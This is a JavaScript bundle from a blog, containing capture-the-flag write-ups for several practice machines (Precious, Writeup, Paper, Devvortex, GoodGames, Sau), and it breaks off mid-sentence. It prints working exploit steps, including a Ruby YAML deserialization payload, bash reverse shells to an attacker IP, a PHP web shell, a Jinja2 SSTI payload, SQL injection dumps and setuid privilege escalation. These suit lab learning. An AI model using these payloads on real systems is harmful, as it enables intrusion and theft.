"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[6663],{6105:e=>{e.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"/Precious","metadata":{"permalink":"/Blog/blog/Precious","editUrl":"https://github.com/danae-pan/Blog/blog/Precious.md","source":"@site/blog/Precious.md","title":"Precious","description":"Task 1","date":"2025-05-24T00:00:00.000Z","tags":[],"readingTime":3.59,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Precious","date":"2025-05-24T00:00:00.000Z"},"unlisted":false,"nextItem":{"title":"Writeup","permalink":"/Blog/blog/Writeup"}},"content":"### Task 1\\n\\nNginx is running with what additional software designed to serve web applications?\\n\\nNavigating to the target IP address we are being redirected to the domain ``precious.htb``. We then add it to the hosts file ``vim /etc/hosts`` and reload the page.\\n\\n![alt text](image-pr-14.png)\\n\\nAfter reloading the page, we see that the website\'s usage is converting web page to pdf.\\n\\n![alt text](image-pr-15.png)\\n\\nWe then run ``whatweb <target_url> -v`` and find that additional to nginx web server, the software running is Phusion Passenger.\\n\\n![alt text](image-pr-16.png)\\n\\n### Task 2 \\n\\nWhich HTTP response header reveals the underlying scripting Language of the web application?\\n\\nFrom the same response of ``whatweb``, we see the HTTP response header that specifies the scripting language.\\n\\n![alt text](image-pr-17.png)\\n\\n### Task 3 \\n\\nWhich Ruby library are the PDF documents generated with?\\n\\nProviding a public url to be converted, we can the error Cannot load remote URL. \\n\\n![alt text](image-pr-18.png)\\n\\nInstead, we start a Python HTTP server by running ``python3 -m http.server 8080``. Then we can provide the IP address of the host machine to be converted as ``http://<host_ip>:8080`` and get a pdf file back.\\n\\nRunning ``exiftool`` against the pdf file we get the information we need about the Ruby library.\\n\\n![alt text](image-pr-19.png)\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 4\\n\\nWhich 2022 CVE applies to that specific version of pdfkit?\\n\\nBy a quick google search we can find the CVE ID 2022-25765 of the Command Injection vulnerability.\\n\\n### Task 5\\n\\nWhich directory located in the running user\'s home directory is used by Bundler to store configuration files?\\n\\nUsing a PoC for the CVE that can be found at [text](https://github.com/shamo0/PDFkit-CMD-Injection), we start a python server again with the same command ``python3 -m http.server 8080`` and listener on port 4444 ``nc -lvnp 4444``. Then we send the curl exploit and we are connected on the target machine. \\n\\n![alt text](image-pr-20.png)\\n\\nMoving to rubycd home directory and running ``ls -a`` to list the directories, including the hidden ones, we see the .bundle file that contains the configuration files.\\n\\n### Task 6\\n\\nSumbit the flag located in the henry user\'s home directory.\\n\\nInside the .bundle directory we open the config file and get the credentials for the user henry.\\n\\n![alt text](image-pr-22.png)\\n\\nThen, we switch to the henry user by running ``su - henry`` and provide the password from before. Running ``whoami`` shows us that we are now user henry.\\n\\nAfter navigating to the henry user\'s home directory and running ``cat user.txt`` we get the user flag.\\n\\n### Task 7\\n\\nWhich command can henry run with sudo, without providing a password?\\n\\nWe are now gonna run the ``LinEnum.sh`` script to enumerate the host. For that purpose, we first get the script on our host machine and then open a Python server on port 8888 on the directory the script is at. Then, on the target machine we run ``wget http://<host_ip>:8888/LinEnum.sh``. Looking through the result we see that the user henry can sudo the command ``/usr/bin/ruby /opt/update_dependencies.rb``.\\n\\n![alt text](image-pr-23.png)\\n\\n### Task 8 \\n\\nWhich is the name of the file that allows for user-controlled input to the update_dependencies.rb script?\\n\\nOpening the file by `` cat /opt/update_dependencies.rb`` we see that the file used is ``dependencies.yml``.\\n\\n![alt text](image-pr-24.png)\\n\\n### Task 9\\n\\nSubmit the flag located in root\'s home directory.\\n\\nFirst, we inspect the file ``update_dependencies.rb`` and see that there is an unsafe load of the file that allows for user-controlled input.\\n\\n```\\ndef list_from_file\\n    YAML.load(File.read(\\"dependencies.yml\\"))\\nend\\n```\\n\\nThe ``YAML.load()`` deserializes YAML into Ruby objects in an insecure way that can lead to arbitary code execution. Based on this gist [text](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml) we craft the following payload and we place it in the henry\'s home directory.\\n\\n```\\n\\ncat << \'EOF\' > dependencies.yml\\n--- \\n- !ruby/object:Gem::Installer\\n  i: x\\n- !ruby/object:Gem::SpecFetcher\\n  i: y\\n- !ruby/object:Gem::Requirement\\n  requirements:\\n    !ruby/object:Gem::Package::TarReader\\n      io: &1 !ruby/object:Net::BufferedIO\\n        io: &1 !ruby/object:Gem::Package::TarReader::Entry\\n          read: 0\\n          header: \\"abc\\"\\n        debug_output: &1 !ruby/object:Net::WriteAdapter\\n          socket: &1 !ruby/object:Gem::RequestSet\\n            sets: !ruby/object:Net::WriteAdapter\\n              socket: !ruby/module \'Kernel\'\\n              method_id: :system\\n            git_set: cp /bin/bash /tmp/dani; chmod +6777 /tmp/dani\\n          method_id: :resolve\\nEOF\\n``` \\n\\nWe run the script as root ``sudo /usr/bin/ruby /opt/update_dependencies.rb`` that is possible without providing password and then use the command ``/tmp/dani -p`` which launches a new shell. The ``-p`` flag tells bash to preserve the effective UID, which is 0 meaning root thanks to the setuid bit of the chmod command. Finally navigating to the ``/root`` directory and ``cat root.txt`` gives us the root flag."},{"id":"/Writeup","metadata":{"permalink":"/Blog/blog/Writeup","editUrl":"https://github.com/danae-pan/Blog/blog/Writeup.md","source":"@site/blog/Writeup.md","title":"Writeup","description":"Task 1","date":"2025-05-12T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":2.535,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Writeup","date":"2025-05-12T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"prevItem":{"title":"Precious","permalink":"/Blog/blog/Precious"},"nextItem":{"title":"Paper","permalink":"/Blog/blog/Paper"}},"content":"### Task 1\\n\\nSubmit user flag.\\n\\nOpening the browser to the IP address of the target it is revealed that the web site uses DDoS protection.\\n\\n![alt text](image-w-2.png)\\n\\nNavigating to ``/robots.txt`` we can see that there is a path called ``writeup/``. \\n\\n![alt text](image-w-3.png)\\n\\nThe ``writeup/`` path shows the following page:\\n\\n![alt text](image-w-4.png)\\n\\nRunning ``whatweb`` against the website ``whatweb <target_ip>/writeup -v`` we find the CMS to be ``CMS Made Simple``.\\n\\n![alt text](image-w-5.png)\\n\\nWe can then try the directories used which can be found at ``http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk/``. \\n\\nTrying out the path ``admin/`` we get a pop-up to authenticate, default credentials ``username=admin`` and ``password=admin`` did not get us in.\\n\\n![alt text](image-w-6.png)\\n\\nNext, other directories are being tried to find the version of the CMS. At ``doc/CHANGELOG.txt`` we found that the version is 2.2.9.1.\\n\\n![alt text](image-w-7.png)\\n\\nUsing ``searchsploit CMS Made Simple`` we search for exploits and find versions lower than 2.2.10 are vulnerable to SQL Injection.\\n\\n![alt text](image-w-8.png)\\n\\nWe can then copy the exploit from searchsploitby running ``searchsploit -m php/webapps/46635.py`` and run it by ``python3 46635.py -u http://<target_ip>/writeup/ -c -w rocktou.txt`` where the -c switch is specified to crack the detected password. The script detects the credentials which we can then use for the admin login prompt. This did not work but after trying ssh with the same credentials ``ssh <username>@<target_ip>`` we get in and find the user flag on the home directory of the user by ``cat user.txt``.  \\n\\n\x3c!--truncate--\x3e \\n\\n### Task 2\\n\\nSubmit root flag.\\n\\nTo see if we can exploit any vulnerabilities on the target machine we run the script for Linux Enumeration. After getting the bash file on the host machine, we open a server on port 8000, on the directory we downloaded the file to, using the command  \\n`python3 -m http.server 8000`\\n\\nOn the target machine we run  \\n`wget http://10.10.14.85:8000/LinEnum.sh -O /tmp/LinEnum.sh`\\n\\nAfter running the script, we find the user being on the staff group which allows users to add local modifications to the system (`/usr/local`) without needing root privileges. This means if root runs a script or command, and that command is resolved to your version in `/usr/local/bin`, it will run your code as root.\\n\\n![alt text](image-w-9.png)  \\n\\nWe run the following to see which services or scripts might be impacted by `/usr/local/bin`:\\n`grep -r \\"/usr/local/bin\\" /etc/profile* /etc/bash.bashrc /etc/pam.d /etc/update-motd.d 2>/dev/null`.\\nWe confirm that `/usr/local/bin` is part of the `PATH` environment and that the update-motd system executes `uname`. Then, we verify that `/etc/update-motd.d/10-uname` indeed runs `uname`, meaning it could execute our payload if replaced:\\n\\n![alt text](image-w-10.png)\\n\\nSince `/usr/local/bin` comes first in the `PATH`, we can hijack `uname` with our own reverse shell payload.\\n\\nWe first start a listener on our machine:  \\n`nc -lvnp 4444`\\n\\nThen we overwrite `uname` with a malicious script in `/usr/local/bin/uname`:  \\n`echo -e \'#!/bin/bash\\\\n/bin/bash -i >& /dev/tcp/10.10.14.85/4444 0>&1\' > /usr/local/bin/uname`  \\n`chmod +x /usr/local/bin/uname`\\n\\nNow, when the system runs `uname` during SSH login, it executes our reverse shell and gives us a root shell.\\n\\nOnce the reverse shell connects back, we are root and we can read the root flag. \\n`cd /root`  \\n`cat root.txt`\\n\\n![alt text](image-w-11.png)"},{"id":"/Paper","metadata":{"permalink":"/Blog/blog/Paper","editUrl":"https://github.com/danae-pan/Blog/blog/Paper.md","source":"@site/blog/Paper.md","title":"Paper","description":"Task 1","date":"2025-05-05T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":4.245,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Paper","date":"2025-05-05T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"prevItem":{"title":"Writeup","permalink":"/Blog/blog/Writeup"},"nextItem":{"title":"Devvortex","permalink":"/Blog/blog/Devvortex"}},"content":"### Task 1 \\n\\nHow many TCP ports are open on the remote host?\\n\\n``nmap -sS <target_ip>``\\n\\n![alt text](image-p-1.png)\\n\\n### Task 2\\n\\nWhat is the domain for the Wordpress blog?\\n\\nFor answering this, we will attempt checking the information coming from the headers. \\n\\n``curl -I <target_ip>``\\n\\n![alt text](image-p-2.png)\\n\\nWe can se that the server is leaking information from the backend systems from the X-Backend-Server header that contains the hostname of the target IP.\\n\\n### Task 3\\n\\nWhich 2019 CVE is the wordpress version vulnerable to?\\n\\nFirst, we need to identify the version of wordpress. First, we add the domain to the host file by ``sudo vim /etc/hosts``\\n\\n![alt text](image-p-3.png)\\n\\nThen, we use wpscan, the WordPress security scanner, to find the version and any vulnerabilities. \\n\\n![alt text](image-p-4.png)\\n\\nWe found both the readme.html file location, which usually contains the wordpress version but the specific version was already identified. With a quick google search about the specific version we find the 2019 CVE.\\n\\n### Task 4\\n\\nWhat is the secret registration URL of the employee chat system?\\n\\nWe first need to enumerate the directories using gobuster dir.\\n\\n``gobuster dir -u http://office.paper/ -w <word_list>``\\n\\n![alt text](image-p-5.png)\\n\\nNavigating to the index.php page we see some kind of chat system.\\n\\n![alt text](image-p-6.png)\\n\\nGoing back to the CVE we previously found, this version could allow an unauthenticated user to view private or draft posts. Navigating to the page we also find this interesting post by the user Prinsonmike. Seems that we can use this wordpress vulnerability to access his draft hoping we can find this secret url.\\n\\n![alt text](image-p-8.png)\\n\\nWe navigate ``http://office.paper/?static=1`` and exploit the vulnerability and find the secret url.\\n\\n![alt text](image-p-9.png)\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 5\\n\\nWhat is the name of the bot running on the Rocket Chat instance?\\n\\nWe need to first add to the hosts file the subdomain ``chat.office.paper`` so the ip get resolved. \\n\\nNavigating to the secret url we found on the previous task we see the registration form.\\n\\n![alt text](image-p-10.png)\\n\\nWe register, and the go to the general channel where we see the name of the bot.\\n\\n![alt text](image-p-11.png)\\n\\n### Task 6\\n\\nWhich recyclops commands allows listing files?\\n\\nIn the \\"How to use me?\\" guide of the bot we see all the commands, including the one listing files.\\n\\n![alt text](image-p-12.png)\\n\\n### Task 7\\n\\nWhat is the file name of the file that contains the configuration information of hubot running on the chat system?\\n\\nHubot is a framework to build chat bots. We will try to chat with recyclops, using the commands available to extract the information about the name of the file. Running ``list`` we see that we are on user dwight home directory. \\n\\n![alt text](image-p-15.png)\\n\\nWe go back to the direcotry with ``list ../`` and then list the directory hubot ``list ../hubot``.\\n\\n![alt text](image-p-16.png)\\n\\nLooking through the listed files and google searching hubot documentation to cross-reference, we see some files that could be possible like ``.env`` and ``external-scripts``. We see their contents, first ``file ../hubot/external-scripts.json`` is empty and then ``file ../hubot/.env`` is the one containing the configuration.\\n\\n![alt text](image-p-17.png)\\n\\n### Task 8\\n\\nWhat is the password obtained from that configuration information?\\n\\nFrom the ``.env`` file we obtained from the previous question, we find the password. \\n\\n### Task 9\\n\\nWhich regular user with a home directory exists on Paper other than rocketchat?\\n\\nFrom the previous tasks, we saw that we where on the regular user dwight directory.\\n\\n### Task 10\\n\\nSubmit the flag located in the dwight user\'s home directory.\\n\\nPreviously, when we listed the home directory, by running ``list ../`` we came accross the ``user.txt`` file. We try to see the contents and get the user flag by ``file ../user.txt`` but we get access denied. We try to ssh to the target ip with the username dwight ``ssh dwight@<target_ip`` and the password we found in the ``.env`` file and we are in! We get the user flag by ``cat user.txt``.\\n\\n### Task 11\\n\\nWhat is the polkit version on the remote host?\\n\\nWe first run ``cat /etc/os-release`` to find which os we are on and we see that we are on CentOS. Then we can run ``rpm -qa | grep polkit\\n`` to find the version of polkit.\\n\\n![alt text](image-p-18.png)\\n![alt text](image-p-19.png)\\n\\n### Task 12\\n\\nWhat is the 2021 CVE ID for the vulnerability in this version of polkit related to bypassing credential checks for D-Bus requests?\\n\\nLooking up for CVEs affecting the version of the polkit found, we find CVE-2021-3560 for the vulnerability that allows an unprivileged user to create an administrative user without authentication by abusing D-Bus and timing. \\n\\n### Task 13\\n\\nIn our machine, we clone the exploit from github https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation. Then, we open a http server on port 8080 using ``python3 -m http.server 8080``. From the remote server, we use wget to get the exploit script ``wget http://<host_ip>:8080/poc.sh``. We then ``chmod +x poc.sh`` and run the exploit as many times as needed to get the timing right. We follow the exploit\'s instruction and get a root shell as the secnigma user. \\n\\nWe navigate to the root directory and obtain the root flag by ``cat root.txt``\\n\\n![alt text](image-p-20.png)"},{"id":"/Devvortex","metadata":{"permalink":"/Blog/blog/Devvortex","editUrl":"https://github.com/danae-pan/Blog/blog/Devvortex.md","source":"@site/blog/Devvortex.md","title":"Devvortex","description":"Task 1","date":"2025-04-25T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":4.585,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Devvortex","date":"2025-04-25T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"prevItem":{"title":"Paper","permalink":"/Blog/blog/Paper"},"nextItem":{"title":"Good Games","permalink":"/Blog/blog/GoodGames"}},"content":"### Task 1\\nHow many open TCP ports are listening on Devvortex?\\n\\nWe can run a nmap to scan the ports on the target ip.\\n\\n``nmap -sS <target_ip>``\\n\\n![alt text](image-d-14.png)\\n\\n### Task 2\\nWhat subdomain is configured on the target\'s web server?\\n\\nNavigating to the ip address on the browser we get this nice screen.\\n\\n![alt text](image-d-15.png)\\n\\nThis seems that the hostname cannot be resolved. Lets edit the /etc/hosts file to add the ip address to be resolved to the target domain.\\n\\n``sudo vim /etc/hosts``\\n\\n![alt text](image-d-16.png)\\n\\nThen for finding the subdomain, we can use gobuster vhost since it is often that htb machine will use name-based virtual hosting, that is when multiple names run on a single ip address.\\n\\n``gobuster vhost -u https://devvortex.htb/ -w usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain``\\n\\n![alt text](image-d-17.png)\\n\\nWe now found the subdomain ``dev.devvortex.htb``.\\n\\n### Task 3\\n\\nWhat Content Management System (CMS) is running on dev.devvortex.htb?\\n\\nWe need to add the previous subdomain we found on the hosts file as well so again, we use the command ``sudo vim /etc/hosts``.\\n\\nFor finding the CMS, we can use WhatWeb.\\n\\nAfter navigating to ``usr/bin`` directory we can run ``whatweb -a 3 dev.devvortex.htb -v``\\n\\n![alt text](image-d-18.png)\\n\\nFrom this search, we could not find the CMS. We can try to dig further on the website by doing a gobuster dir seach to explore further endpoints. \\n\\n``gobuster dir -u http://dev.devvortex.htb -w common.txt``\\n\\nFrom this search we found many endpoints with different status code that will be useful in the following task, one of them is the /administrator endpoint which is usually an interesting finding.\\n\\nNavigating there we see a usual administrator login that reveals that the CMS used is Joomla.\\n\\n![alt text](image-d-19.png)\\n\\nWe csn also find this  looking in the /robots.txt endpoint which is a file that contains the redirections and other info. \\n\\n![alt text](image-d-20.png)\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 4 \\n\\nWhich version of Joomla is running on the target system?\\n\\nThe information about Joomla version is usually on a public facing file that is located on different paths depending on the version of Joomla. It is often that the information is stores under modules diretory or under libraries but this varies. After a google search lookup we find different sources including https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website. Finally, navigating to ``http://dev.devvortex.htb/administrator/manifests/files/joomla.xml`` we find the Joomla version.\\n\\n![alt text](image-d-22.png)\\n\\n### Task 5\\n\\nWhat is the 2023 CVE ID for an information disclosure vulnerability in the version of Joomla running on DevVortex?\\n\\nSearching google for vulnerabilities of the specific Joomla version we found, we quickly find that the CVE-2023-23752 that affects a series of Joomla version including ours.\\n\\n### Task 6\\n\\nWhat is the lewis user\'s password for the CMS?\\n\\nWe launch metasploit ``msfconsole`` and search for the cve we found before. \\n\\n![alt text](image-d-21.png)\\n\\nWe then ``use 0`` to select the options, then ``set RHOSTS dev.devvortex.htb`` to set the target host and finally ``run`` to run the auxiliary. From this, we successfully get the user\'s password. \\n\\n![alt text](image-d-23.png)\\n\\n### Task 7\\n\\nWe can use the credentials from previously to login as administrator on the /administrator endpoint. Navigating to System page we find that there is the template option. Under Site Templates we edit the Cassiopeia Details and Files.\\n\\n![alt text](image-d-24.png)\\n\\nWe add this line of code ``system($_GET[\'cmd\']);`` on the error.php file to get a reverse shell. Before navigating to  ``http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=bash -c \\"bash -i >%26 /dev/tcp/<local_ip>/4444 0>%261\\"`` we need to open a port listening for connections. We can do this by ``nc -lnvp 4444``. After navigating to that url, we obtain a shell.\\n\\n![alt text](image-d-26.png)\\n\\nFirst we spawn a proper shell so we don\'t get stuck onwards. \\n\\n``python3 -c \'import pty; pty.spawn(\\"/bin/bash\\")\'``\\n\\nWe can now connect to the database with the credential we found before.\\n\\n``mysql -u lewis -p``\\nP4ntherg0t1n5r3c0n##\\n\\n![alt text](image-d-27.png)\\n\\nWe list all tables by ``show tables;`` and then ``describe sd4fg_users;`` to see all fields for the user. There, we identfy that this is the table we are asked for by ``select username, id, password from sd4fg_users where username = \'logan\';`` and see the hashed password.\\n\\n![alt text](image-d-28.png)\\n\\n### Task 8\\n\\nFrom the previous task, we listed the hashed password for the logan user by using the select command. We open a new terminal and store this password on a file named ``logan.hash`` and then we can use john the ripper to crack the password so we can obtain the plain text from the hashed version. \\n\\n![alt text](image-d-29.png)\\n\\n### Task 9 \\n\\nSubmit the flag located in the logan user\'s home directory.\\n\\nWith the password we found from the previous task, we ssh to the server with the user logan. \\n\\n![alt text](image-d-30.png)\\n\\nIn this user\'s home directory we find the user.txt that contains the user\'s flag.\\n\\n### Task 10 \\n\\nWhat is the full path to the binary that the lewis user can run with root privileges using sudo?\\n\\nWe can find the path by running ``sudo -l``.\\n\\n![alt text](image-d-31.png)\\n\\n### Task 11\\n\\nWhat is the 2023 CVE ID of the privilege escalation vulnerability in the installed version of apport-cli?\\n\\nWith a google search, we find the id of the CVE to be CVE-2023-1326. \\n\\n### Task 12\\n\\nSubmit the flag located in the root user\'s home directory.\\n\\nWe start by running sudo /usr/bin/apport-cli --file-bug\\n![alt text](image-d-32.png)\\n\\nThere we press any key:\\n\\n![alt text](image-d-33.png)\\n\\nThen we press any key, and finally the option of view report (V) where we land in a text viewer and obtain the root shell by running ``!/bin/bash``\\n\\n![alt text](image-d-34.png)\\n\\nIn the home directory of the root user we find the root.txt which contains the root\'s flag."},{"id":"/GoodGames","metadata":{"permalink":"/Blog/blog/GoodGames","editUrl":"https://github.com/danae-pan/Blog/blog/GoodGames.md","source":"@site/blog/GoodGames.md","title":"Good Games","description":"Task 1","date":"2025-04-20T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"windows","permalink":"/Blog/blog/tags/windows"}],"readingTime":4.89,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Good Games","date":"2025-04-20T00:00:00.000Z","tags":["easy","windows"]},"unlisted":false,"prevItem":{"title":"Devvortex","permalink":"/Blog/blog/Devvortex"},"nextItem":{"title":"Sau","permalink":"/Blog/blog/Sau"}},"content":"### Task 1\\n\\nSubmit User Flag\\n\\nWe use nmap to find the services on the target machine and we see that an apache server runs on port 80.\\n\\n``nmap -sV target_ip``\\n\\n![alt text](image-g.png)\\n\\nNavigating to the browser we see a login page where we will try bypassing the authentication using SQL injection.\\n\\nServer-Side Template Injection (SSTI) vulnerability arises when an application incorporates user-supplied input directly into its server-side templates without proper sanitization or validation. Template engines, which combine templates with dynamic data to generate web pages, can be exploited through SSTI attacks.\\n\\n\\nTo find forms that are candidates for sql injection run\\n\\n``sqlmap -u \\"http://10.129.51.14/\\" --forms --crawl=2 --dbms=mysql``\\n\\n--crawl=CRAWLDEPTH: crawls the website starting from the target url\\n\\nWe find a total of 8 targets. One of the identified forms is the login form and sqlmap auto-filled blank fields, tried multiple techniques and identified that the email field is vulnerable to time-based blind SQL injection.\\n\\n![alt text](image-g-3.png)\\n\\n![alt text](image-g-5.png)\\n\\nAfter confirming the vulnerability we want to enumerate the database and find the table storing the usernames and passwords to get the user flag.\\n\\nWe can try running the following command to retrieve the databse names.\\n\\n``sqlmap -u \\"http://10.129.51.14/login\\" --data=\\"email=*&password=test123\\" --dbs``\\n\\nWe found 2 available databases named information_schema and main.\\n\\nNext, we will list the tables from each.\\n\\n``sqlmap -u \\"http://10.129.51.14/login\\" --data=\\"email=*&password=test123/login\\" -D <database_name> --tables``\\n\\nStarting with the database named main, we find 3 tables blog, blog_comments and user and which we can further investigate.\\nWe start with the table user.\\n\\n``sqlmap -u \\"http://10.129.51.14/login\\" --data=\\"email=*&password=test123/login\\" -D main -T user --columns``\\n\\nThere, we find 4 columns in total with a column named email and a column name password that might get us the flags we need.\\n\\n![alt text](image-g-9.png)\\n\\nWe then run the following command to retreive that information.\\n\\n``sqlmap -u \\"http://10.129.51.14/login\\" --data=\\"email=*&password=test123/login\\" -D main -T user -C email,password --dump``\\n\\nWe find the email and the password and with those credentials we login after we use a hash cracker to find the plain texts password from the hashed one.\\n\\nNow that we are logged in as admin, we can see a gear on the top right that redirects as to internal-administration.goodgames.htb. We need to edit the /etc/hosts file to point this domain to the target machine\'s IP.\\nNote, editing the hosts file requires administrative privileges.\\n\\n\x3c!--truncate--\x3e \\n\\nFollowing the url, we see a login page:\\n![alt text](image-g-10.png)\\n\\nThere we reuse the credentials that we found on the previous step, where admin is the username. \\nWe are presented with a dashborad for the admin.\\n\\n![alt text](image-g-11.png)\\n\\nAfter we are in we attempt to find a palce where sql injection is possible. Navigating to the settings page,\\nwe see the general information where we can try sql injection on the field of the full name.\\nWe try the usual test of \' OR 1=1 --- and we see this renders as the full name. We then try \\\\{{1+1}} for Jinja2 (Python) and we see this results to two, \\nso we confirm SSTI (Server Side Template Injection) which can lead to an RCE.\\nNow we can go on with jinja2 exploitation. \\n\\nFirst we open a port locally:\\n\\n``nc -lvnp 4343``\\n\\nDifferent ways using some python libraries to exploit including:\\n\\n```\\n{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\'id\').read() }}\\n{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen(\'id\').read() }}\\n{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen(\'id\').read() }}\\n```\\n\\nOr in the shotest versions:\\n```\\n{{ cycler.__init__.__globals__.os.popen(\'id\').read() }}\\n{{ joiner.__init__.__globals__.os.popen(\'id\').read() }}\\n{{ namespace.__init__.__globals__.os.popen(\'id\').read() }}\\n```\\n\\nWe used \\n``{{ cycler.__init__.__globals__.os.popen(\'bash -c \\"bash -i >& /dev/tcp/<local_ip>/<exposed_port> 0>&1\\"\').read() }}``\\n\\nWe now got the root control of the server\\n\\n![alt text](image-g-13.png)\\n\\nWe can then navigate to /home/augustus where we find the user.text, in which the user flag is user flag is located.\\n\\n### Task 2\\n\\nBut since we are already a root user but not finding any root.txt under the /root directory, we might be inside a container.\\n\\nWe can invistigate the cgroup file under the proc folder that contains all processes.\\n\\n![alt text](image-g-15.png)\\n\\nFrom this file, we understand that we are inside a docker container. So, we need to access the host from the container which is known as container escape or breakout.\\n\\nOne way of container gaining access to host file systems, is if they areconfigured to run with the SYS_ADMIN capability which allows\\ncontainers to perform actions through the linux kernel that would be available only to root users on a linux server.\\n\\ncapa=`cat /proc/1/status | grep -i \'CapEff\' | awk \'{print $2}\'`; capsh --decode=$capa\\n\\n\\ngrep CapEff /proc/$$/status\\n\\nCapEff this set represents all the capabilities the process is using at a specific moment in time. \\nThen we need to decode the permitted capcbility using capsh.\\n\\n``capsh -- decode=xxxxxx00000000a80425fb``\\n\\n![alt text](image-g-16.png)\\n\\nAfter decoding, we see that the cap_sys_admin capability is not there, so we cannot use this to escape the container.\\n\\nWe then can try ssh to the host machine using the username augustus and the password we had before found for the admin\\n``ssh augustus@172.19.0.1``\\n\\nAnd it works! \\n\\nSince the container mounts /home/augustus from the host anything the container writes in this directory, is also visible on the host and vice versa.\\n\\nHaving said that we can follow the next steps to create a SUID-root bash binary on the host via a shared volume.\\nWhile in the host we copy the /bin/bash to the current dirrectory ``cp /bin/bash .``.\\nThen inside the container we can:\\n\\n```\\nchown root:root /home/augustus/bash\\nchmod 4777 /home/augustus/bash\\n```\\n\\nNow going back to host, we run ``./bash -p`` to get a root shell and finally get the root flag.\\n\\n![alt text](image-g-18.png)\\n\\nWhat is blind SQL injection?\\n\\n\\nBlind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.\\nMany techniques as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the inkected query within the application\'s responses."},{"id":"/Sau","metadata":{"permalink":"/Blog/blog/Sau","editUrl":"https://github.com/danae-pan/Blog/blog/Sau.md","source":"@site/blog/Sau.md","title":"Sau","description":"Task 1","date":"2025-04-12T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":3.935,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Sau","date":"2025-04-12T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"prevItem":{"title":"Good Games","permalink":"/Blog/blog/GoodGames"},"nextItem":{"title":"Jerry","permalink":"/Blog/blog/Jerry"}},"content":"### Task 1\\n\\nWhich is the highest open TCP port on the target machine?\\n\\nWe can use nmap to scan ports in the target machine. \\n\\n```nmap -sS -p- <target_ip>```\\n\\n![alt text](image.png)\\n\\n### Task 2\\n\\nWhat is the name of the open source software that the application on 55555 is \\"powered by\\"?\\n\\nTo find information about the software, we can run nmap again with the additional field **-sV**. \\n\\n```nmap -sV -p <target_port> <target_ip>```\\n\\nFrom the result we see that the service is identified as uknown. Even so, we can infer from the fingerprint that is returned that the service is HTTP-based since it responds with HTTP headers. Part of the response is illustrated bellow:\\n\\n![alt text](image-1.png)\\n\\nWe can then navigate to the ip address on the browser and at the bottom of the page we can find the open source software the application is powered by.\\n\\n![alt text](image-2.png)\\n\\n### Task 3\\n\\nWhat is the version of request-baskets running on Sau?\\n\\nFrom the previous task we also see the version of the open source software. \\n\\n### Task 4 \\n\\nWhat is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?\\n\\nBy a quick search on cve.org we can find the CVE ID of this vulnerability. https://www.cve.org/CVERecord?id=CVE-2023-27163\\n\\n### Task 5\\n\\nWhat is the name of the software that the application running on port 80 is \\"powered by\\"?\\n\\nFrom the previous task, we suspect that we can find the software from exploiting the SSRF vulnerability. Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can manipulate a web application into sending unauthorized requests from the server. This vulnerability often occurs when an application makes HTTP requests to other servers based on user input which is exactly what we have in hand when we access the target ip in the browser.\\n\\n![alt text](image-3.png)\\n\\nUsing the vulnerable application, we can exploit the SSRF vulnerability by creating a basket that forwards requests to http://localhost:80 gaining access to the web server that runs the application we are looking for.\\n\\nWe can do that by adding the endpoint. We got the token for the basket created. \\n\\nThen we can configure the basket to forward requests to an internal service. We open the basket, and on the configuration settings we set the forward url to be our local host on port 80.\\n\\n![alt text](image-7.png)\\n\\nThen, if we navigate to the endpoint we made on the browser, it would redirect us to the service running on port 80.\\n\\nThere, on the bottom we see the name of the software.\\n\\n![alt text](image-8.png)\\n\\n\x3c!--truncate--\x3e \\n\\n### Task 6 \\n\\nThere is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path on the webserver targeted by this exploit?\\n\\nBy searching for the vulnerability we find that it exists in the login page. The relative path is ``\\\\login``.\\n\\n### Task 7\\n\\nWhat system user is the Mailtrack application running as on Sau?\\n\\nWe launch Metasploit by running ``msfconsole`` and search ``search mailtrail`` to see if the metasploit framework has any exploits available for the vulnerability. \\n\\n![alt text](image-11.png)\\n\\nWe can see that the only exploit listed is for the vulnerability we are targeting. \\n\\nWe can use the exploit by ``use 0``\\nand see the options that need to be configured by ``show options``\\n\\nWe set RHOSTS, RPORT to the target IP and port and the TARGETURI to the targeted configured endpoint. We 